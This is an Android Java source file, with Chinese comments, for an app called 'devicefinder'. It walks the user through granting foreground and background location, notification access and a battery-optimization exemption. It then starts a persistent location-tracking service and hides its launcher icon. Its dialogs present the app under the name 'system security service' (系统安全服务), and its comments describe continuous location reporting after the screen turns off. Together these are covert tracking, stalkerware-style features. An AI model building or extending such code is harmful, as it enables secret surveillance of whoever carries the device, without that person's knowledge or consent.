package com.example.devicefinder;

import android.Manifest;
import android.app.Activity;
import android.app.AlertDialog;
import android.content.ComponentName;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.provider.Settings;
import android.widget.Toast;

public class MainActivity extends Activity {

    // 权限申请回调码：前台定位 / 后台定位 / 通知
    private static final int REQ_FG_LOC = 100;
    private static final int REQ_BG_LOC = 101;
    private static final int REQ_NOTIFICATION = 102;

    // 电池优化引导最多提示次数，避免死循环骚扰用户
    private static final int MAX_BATTERY_PROMPT = 3;

    // 防止权限回调与 onCreate 重复拉起服务
    private boolean serviceStarted = false;

    // 标记当前是否正在等待用户从电池优化设置页返回
    private boolean waitingForBatterySettings = false;

    private final Handler mainHandler = new Handler(Looper.getMainLooper());

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        if (getIntent() != null && getIntent().getCategories() != null
                && getIntent().getCategories().contains(Intent.CATEGORY_LAUNCHER)) {
            Toast.makeText(this, "🛡️ 备用机守护系统初始化中", Toast.LENGTH_SHORT).show();
        }

        // 授权链第一步：前台定位权限
        if (!hasForegroundLocationPermission()) {
            requestForegroundLocation();
        } else {
            proceedAfterForegroundLocation();
        }
    }

    @Override
    protected void onResume() {
        super.onResume();

        // 用户从电池优化设置页返回时，检查是否真的完成了豁免
        if (waitingForBatterySettings) {
            waitingForBatterySettings = false;
            if (isBatteryOptimizationIgnored()) {
                // 已完成，继续后续流程
                Toast.makeText(this, "✅ 电池优化已关闭，后台定位已就绪", Toast.LENGTH_SHORT).show();
                startTrackingServiceIfNeeded();
            } else {
                // 仍未完成，再次引导（受次数限制）
                promptBatteryOptimizationAgain();
            }
        }
    }

    // ==================== 权限链：前台定位 → 后台定位 → 通知 → 电池优化 → 启动服务 ====================

    private boolean hasForegroundLocationPermission() {
        if (Build.VERSION.SDK_INT < 23) return true;
        return checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED
                || checkSelfPermission(Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED;
    }

    private void requestForegroundLocation() {
        if (Build.VERSION.SDK_INT >= 23) {
            requestPermissions(new String[]{
                    Manifest.permission.ACCESS_FINE_LOCATION,
                    Manifest.permission.ACCESS_COARSE_LOCATION
            }, REQ_FG_LOC);
        } else {
            proceedAfterForegroundLocation();
        }
    }

    private void proceedAfterForegroundLocation() {
        if (Build.VERSION.SDK_INT >= 29 && !hasBackgroundLocationPermission()) {
            if (Build.VERSION.SDK_INT >= 30) {
                Toast.makeText(this, "请在设置页选择「权限」→「位置信息」→「始终允许」", Toast.LENGTH_LONG).show();
                mainHandler.postDelayed(new Runnable() {
                    @Override
                    public void run() {
                        try {
                            Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
                            intent.setData(Uri.parse("package:" + getPackageName()));
                            startActivity(intent);
                        } catch (Exception ignored) {}
                    }
                }, 500);
                proceedAfterBackgroundLocation();
            } else {
                requestPermissions(new String[]{Manifest.permission.ACCESS_BACKGROUND_LOCATION}, REQ_BG_LOC);
            }
        } else {
            proceedAfterBackgroundLocation();
        }
    }

    private boolean hasBackgroundLocationPermission() {
        if (Build.VERSION.SDK_INT < 29) return true;
        return checkSelfPermission(Manifest.permission.ACCESS_BACKGROUND_LOCATION) == PackageManager.PERMISSION_GRANTED;
    }

    private void proceedAfterBackgroundLocation() {
        if (Build.VERSION.SDK_INT >= 33
                && checkSelfPermission(Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED) {
            requestPermissions(new String[]{Manifest.permission.POST_NOTIFICATIONS}, REQ_NOTIFICATION);
        } else {
            proceedAfterNotification();
        }
    }

    // 通知权限处理完后：先启动服务，再处理电池优化
    private void proceedAfterNotification() {
        startTrackingService();
        promptBatteryOptimization();
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);

        if (requestCode == REQ_FG_LOC) {
            boolean granted = grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED;
            if (granted) {
                proceedAfterForegroundLocation();
            } else {
                Toast.makeText(this, "⚠️ 未授予定位权限，定位功能不可用", Toast.LENGTH_LONG).show();
                proceedAfterBackgroundLocation();
            }
        } else if (requestCode == REQ_BG_LOC) {
            boolean granted = grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED;
            if (!granted) {
                Toast.makeText(this, "⚠️ 未授予后台定位，锁屏后可能无法更新位置", Toast.LENGTH_LONG).show();
            }
            proceedAfterNotification();
        } else if (requestCode == REQ_NOTIFICATION) {
            proceedAfterNotification();
        }
    }

    // ==================== 电池优化：循环引导直到完成或用户放弃 ====================

    private boolean isBatteryOptimizationIgnored() {
        try {
            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
            return pm != null && pm.isIgnoringBatteryOptimizations(getPackageName());
        } catch (Exception e) {
            return false;
        }
    }

    // 首次引导：如果已豁免则直接跳过，否则弹对话框说明利害并跳转
    private void promptBatteryOptimization() {
        if (isBatteryOptimizationIgnored()) {
            return; // 已完成，无需提示
        }

        int promptCount = getPromptCount();
        if (promptCount >= MAX_BATTERY_PROMPT) {
            // 已提示多次，不再骚扰，但给出警告
            Toast.makeText(this, "⚠️ 未关闭电池优化，息屏后可能无法定位", Toast.LENGTH_LONG).show();
            return;
        }

        new AlertDialog.Builder(this)
                .setTitle("必须关闭电池优化")
                .setMessage("为保证手机息屏后仍能持续上报位置，\n请将本应用设为「不限制」/「无限制」。\n\n" +
                        "如果不设置，系统会在息屏后暂停本应用的网络和定位，导致你收不到位置信息。")
                .setCancelable(false)
                .setPositiveButton("去设置", new DialogInterface.OnClickListener() {
                    @Override
                    public void onClick(DialogInterface dialog, int which) {
                        incrementPromptCount();
                        openBatteryOptimizationSettings();
                    }
                })
                .setNegativeButton("暂时跳过", new DialogInterface.OnClickListener() {
                    @Override
                    public void onClick(DialogInterface dialog, int which) {
                        incrementPromptCount();
                        Toast.makeText(MainActivity.this,
                                "⚠️ 已跳过，息屏后可能收不到定位", Toast.LENGTH_LONG).show();
                    }
                })
                .show();
    }

    // 用户从设置页返回但仍未完成时的二次引导
    private void promptBatteryOptimizationAgain() {
        if (getPromptCount() >= MAX_BATTERY_PROMPT) {
            Toast.makeText(this, "⚠️ 未关闭电池优化，息屏后可能无法定位", Toast.LENGTH_LONG).show();
            return;
        }

        new AlertDialog.Builder(this)
                .setTitle("电池优化仍未关闭")
                .setMessage("检测到本应用仍受电池优化限制。\n\n" +
                        "请进入「电池」→「应用耗电管理」或「电池优化」，找到「系统安全服务」，\n" +
                        "选择「不限制」/「无限制」/「允许后台活动」。")
                .setCancelable(false)
                .setPositiveButton("再去设置", new DialogInterface.OnClickListener() {
                    @Override
                    public void onClick(DialogInterface dialog, int which) {
                        incrementPromptCount();
                        openBatteryOptimizationSettings();
                    }
                })
                .setNegativeButton("放弃", new DialogInterface.OnClickListener() {
                    @Override
                    public void onClick(DialogInterface dialog, int which) {
                        incrementPromptCount();
                        Toast.makeText(MainActivity.this,
                                "⚠️ 已放弃，息屏后可能收不到定位", Toast.LENGTH_LONG).show();
                    }
                })
                .show();
    }

    // 跳转电池优化设置：优先直接弹窗，不支持时降级到列表页
    private void openBatteryOptimizationSettings() {
        waitingForBatterySettings = true;
        try {
            Intent directIntent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
            directIntent.setData(Uri.parse("package:" + getPackageName()));

            if (directIntent.resolveActivity(getPackageManager()) != null) {
                startActivity(directIntent);
            } else {
                Toast.makeText(this, "请在列表中找到「系统安全服务」并设为「不优化」", Toast.LENGTH_LONG).show();
                startActivity(new Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS));
            }
        } catch (Exception e) {
            // 极少数 ROM 连列表页都不支持
            waitingForBatterySettings = false;
            Toast.makeText(this, "⚠️ 无法打开电池优化设置，请手动前往系统设置", Toast.LENGTH_LONG).show();
        }
    }

    private int getPromptCount() {
        SharedPreferences sp = getSharedPreferences("battery_prompt_prefs", MODE_PRIVATE);
        return sp.getInt("prompt_count", 0);
    }

    private void incrementPromptCount() {
        SharedPreferences sp = getSharedPreferences("battery_prompt_prefs", MODE_PRIVATE);
        int count = sp.getInt("prompt_count", 0) + 1;
        sp.edit().putInt("prompt_count", count).apply();
    }

    // ==================== 启动服务 & 自动隐身 ====================

    private void startTrackingService() {
        if (serviceStarted) return;
        serviceStarted = true;

        Intent intent = new Intent(this, TrackingService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent);
        } else {
            startService(intent);
        }

        hideLauncherIcon();

        // 延迟关闭，给组件状态落盘和电池优化跳转留时间。
        // 但若还在等待用户处理电池优化，则不关闭，等 onResume 处理完再关。
        mainHandler.postDelayed(new Runnable() {
            @Override
            public void run() {
                if (!waitingForBatterySettings) {
                    finish();
                }
            }
        }, 2000);
    }

    // 如果服务已启动但 Activity 还活着（比如从电池设置返回），确保服务在跑
    private void startTrackingServiceIfNeeded() {
        if (!serviceStarted) {
            startTrackingService();
        } else {
            // 服务已启动，直接关闭界面
            mainHandler.postDelayed(new Runnable() {
                @Override
                public void run() {
                    finish();
                }
            }, 500);
        }
    }

    private void hideLauncherIcon() {
        try {
            PackageManager pm = getPackageManager();
            ComponentName alias = new ComponentName(this, "com.example.devicefinder.VisibleAliasActivity");
            if (pm.getComponentEnabledSetting(alias) != PackageManager.COMPONENT_ENABLED_STATE_DISABLED) {
                pm.setComponentEnabledSetting(alias,
                        PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                        PackageManager.DONT_KILL_APP);
            }
        } catch (Exception ignored) {}
    }
}
